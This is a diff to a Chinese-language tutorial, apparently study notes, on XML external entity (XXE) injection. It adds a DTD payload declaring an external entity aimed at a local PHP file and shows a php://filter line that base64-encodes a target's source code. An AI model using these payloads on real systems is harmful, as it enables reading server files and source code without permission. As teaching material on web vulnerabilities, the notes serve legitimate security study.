@@ -150,9 +150,18 @@
 
     ![image-20220517203246919](XXE/image-20220517203246919.png)
 
-6. 同样的，这里也可以用 php 的伪协议：
+6. 同样的，如果是 PHP 的站点，`SYSTEM` 后面也可以用 php 的伪协议，例如 `filter` 和 `file`：
 
     `"php://filter/read=convert.base64-encode/resource=xxe02.php"`
+    
+7. 具体的案例中，`&` 要在有回显的地方调用：
+    ```xml-dtd
+    <?xml version="1.0"?>
+    <!DOCTYPE a [
+        <!ENTITY b SYSTEM "http://localhost/xxe02.php">
+        ]>
+    <有回显的地方>&b;</有回显的地方>
+    ```
 
 ### 2. 没有回显的注入
 
